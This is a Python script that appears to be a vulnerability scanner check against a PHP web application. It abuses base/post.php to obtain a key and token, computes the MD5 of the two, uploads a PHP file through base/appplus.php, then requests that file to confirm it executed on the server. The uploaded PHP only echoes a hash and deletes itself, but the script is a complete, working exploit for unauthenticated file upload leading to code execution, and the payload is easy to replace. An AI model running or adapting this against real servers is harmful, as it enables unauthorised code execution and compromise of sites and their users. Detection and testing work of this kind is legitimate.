import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=randomInt(40000, 44800)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
rboundary=randomLowercase(8)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
randname=randomLowercase(6)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"base/post.php"
	body="act=appcode"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "k=" in response.text and "t=" in response.text:
		r0=True
		try:
			key=re.findall("k=(\\w+)",response.text)[0]
			token=re.findall("t=(\\d+)",response.text)[0]
			md=md5(str(key+token).encode()).hexdigest()
		except:
			token=''
			md=''
	else:
		token=''
		md=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"base/appplus.php"
	body='''------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="file"; filename="'''+randname+'''.php"\r
Content-Type: application/octet-stream\r
\r
<?php echo md5('''+str(f1)+''');unlink(__FILE__);?>\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="act"\r
\r
upload\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="r_size"\r
\r
41\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="t"\r
\r
'''+token+'''\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="m"\r
\r
'''+md+'''\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="path"\r
\r
upload\r
------WebKitFormBoundary'''+rboundary+'''\r'''
	headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'+rboundary+''}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and ".php" in response.text:
		r1=True
		try:
			fname=re.findall("upload/(\\w+.php)",response.text)[0]
		except:
			fname=''
	else:
		fname=''
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"upload/{fname}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
